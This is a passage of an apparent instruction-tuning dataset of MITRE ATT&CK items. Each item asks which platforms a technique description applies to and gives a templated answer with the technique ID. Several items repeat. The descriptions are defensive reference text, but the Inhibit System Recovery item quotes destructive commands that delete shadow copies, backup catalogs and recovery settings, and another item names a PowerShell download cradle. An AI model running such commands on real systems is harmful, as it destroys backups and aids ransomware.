    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>  \n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
    "context": "",
    "output": "The provided description is related to MITRE technique Inhibit System Recovery (T1490);\nTechnique Inhibit System Recovery (T1490) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>  \n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
      "answer": "The provided description is related to MITRE technique Inhibit System Recovery (T1490);\nTechnique Inhibit System Recovery (T1490) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Transfer Size Limits (T1030);\nTechnique Data Transfer Size Limits (T1030) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
      "answer": "The provided description is related to MITRE technique Data Transfer Size Limits (T1030);\nTechnique Data Transfer Size Limits (T1030) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
